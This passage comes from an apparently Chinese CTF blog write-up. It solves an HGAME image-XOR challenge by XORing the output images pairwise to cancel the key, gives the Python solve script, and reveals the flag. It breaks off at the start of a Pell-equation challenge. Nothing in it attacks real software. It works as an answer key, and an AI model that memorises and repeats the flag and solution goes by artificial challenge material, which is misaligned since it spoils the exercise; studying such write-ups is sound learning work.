class="comment">#遍历每一行</span></span><br><span class="line">            r1, g1, b1 = pixels1[x, y]   <span class="comment">#颜色值RGB</span></span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2) <span class="comment">#三值异或 完成像素点的异或</span></span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成一定数量的指定长度的唯一随机字符串  恢复时间的 看看有没有什么顺序 =&gt; 无</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_unique_strings</span>(<span class="params">n, length</span>):</span><br><span class="line">    unique_strings = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(unique_strings) &lt; n:</span><br><span class="line">        random_string = secrets.token_hex(length // <span class="number">2</span>)</span><br><span class="line">        unique_strings.add(random_string)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(unique_strings)</span><br><span class="line"></span><br><span class="line"><span class="comment">#给图像命名 图片个数就是flag的字符数</span></span><br><span class="line">random_strings = generate_unique_strings(<span class="built_in">len</span>(flag), <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line">key_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#以一定的时间顺序保存图片</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">image, name</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    image.save(<span class="string">&quot;.\\png_out\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    current_image = draw_text(current_image, <span class="number">120</span>, <span class="number">80</span>, flag[i]) <span class="comment">#将flag的每个字符逐个绘制到current_image中</span></span><br><span class="line">    <span class="comment">#为了保证字符的顺序 设置了时间线程 与keyimage异或 函数是random_time 参数args分别是图片和名称</span></span><br><span class="line">    threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意读取当前目录的文件时 一定要看控制台的目录！</p><ul><li>时间函数测试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">h</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    <span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    threading.Thread(target=random_time, args=(i,)).start()</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">6</span><br><span class="line">9</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">5</span><br><span class="line">8</span><br><span class="line">0</span><br><span class="line">7</span><br><span class="line">证明生成的顺序是不一定的</span><br></pre></td></tr></table></figure><hr><p>分析一下题目的加密过程：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>1</mn></msub><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>2</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>2</mn></msub><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>3</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>3</mn></msub><mspace linebreak="newline"></mspace><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>20</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>20</mn></msub><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>21</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>21</mn></msub></mrow><annotation encoding="application/x-tex">C_1 \bigoplus K = O_1\\C_2 \bigoplus K = O_2\\C_3 \bigoplus K = O_3\\...\\C_{20} \bigoplus K = O_{20}\\C_{21} \bigoplus K = O_{21}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>目前我们得到的是Output 一共是21张图片 证明flag的长度是21</p><p>按照正常顺序 从C1到C21是每张图片多一个字符 假设flag为<code>hgame&#123;123456789abcde&#125;</code></p><p>则有：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>h</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>4</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>5</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mspace linebreak="newline"></mspace><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>20</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy="false">{</mo><mn>123456789</mn><mi>a</mi><mi>b</mi><mi>c</mi><mi>d</mi><mi>e</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>21</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy="false">{</mo><mn>123456789</mn><mi>a</mi><mi>b</mi><mi>c</mi><mi>d</mi><mi>e</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">C_1=h\\C_2=hg\\C_3=hga\\C_4=hgam\\C_5=hgame\\...\\C_{20}=hgame\{123456789abcde\\C_{21}=hgame\{123456789abcde\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mopen">{</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mopen">{</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mclose">}</span></span></span></span></span></p><p>所以我们创建一个21*21的循环空间 让每一个Output都与其他Output做异或 这样K与K异或消失  只剩下C与C异或</p><p>因为图像的异或是逐个像素点 所以像素点相同的地方会直接消失</p><p>我们关注最后两组 当O20和O21异或 等价于 C20和C21异或</p><p>相同部分消失 则只剩下<code>&#125;</code></p><p>但是因为进程时间的操作 我们不知道O20和O21是哪个 但是只有<code>&#125;</code>的图片只能有两个</p><p>一个是O20与其他所有循环异或 直到O20^O21</p><p>一个是O21与其他所有循环异或 直到O21^O20</p><p>范围大大所以 这只要看一下这两个循环哪个能有结果即可</p><p>因为O21与其他异或的时候</p><p>与C20异或得到<code>&#125;</code></p><p>与C19异或得到<code>e&#125;</code></p><p>与C18异或得到<code>de&#125;</code></p><p>字符个数是确定的</p><p>所以我们就能从后往前恢复出flag啦！</p><hr><p>回到题目</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片文件夹路径</span></span><br><span class="line">folder_path = <span class="string">&quot;png_out&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件夹中的所有图片文件</span></span><br><span class="line">image_files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(folder_path) <span class="keyword">if</span> file.endswith(<span class="string">&quot;.png&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#对图像进行异或 </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line"><span class="comment"># 读取第二个图片并执行异或操作</span></span><br><span class="line">        out1 = Image.<span class="built_in">open</span>(os.path.join(folder_path, image_files[i]))</span><br><span class="line">        out2 = Image.<span class="built_in">open</span>(os.path.join(folder_path, image_files[j]))</span><br><span class="line">        key_image = xor_images(out1, out2)</span><br><span class="line">        key_image.save(<span class="string">&quot;.\\keykey\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(count))</span><br><span class="line">        count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>result:</strong></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240201115137615.png" alt="image-20240201115137615"></p><p>这是异或的结果 锁定第73个 生成下标是（3,10） 确认的方法是66为空 是3与3异或</p><p>所以下标为3的图片可能是C20也可能是C21 生成范围是63-83这21张图</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240201115403401.png" alt="image-20240201115403401"></p><p>提取出来 根据字符个数得到后16个字符的生成过程</p><p>前6个为<code>hgame&#123;</code> 就不浪费时间了</p><p>如果上面这个推不出来</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240201115534999.png" alt="image-20240201115534999"></p><p>其实我们也能看到另一个 相当于下标（10,3）产生的结果 这个无法恢复</p><p>综上证明下标为3（也就是png_out的第4张图）的是C21 下标为10（也就是png_out的第11张图）的是C20</p><p>到此完结flag：<code>hgame&#123;1adf_17eb_803c&#125;</code></p><h4 id="ezmath">ezMath</h4><h5 id="考点：佩尔方程">考点：佩尔方程</h5><h5 id="解题：">解题：</h5><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,y,x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span 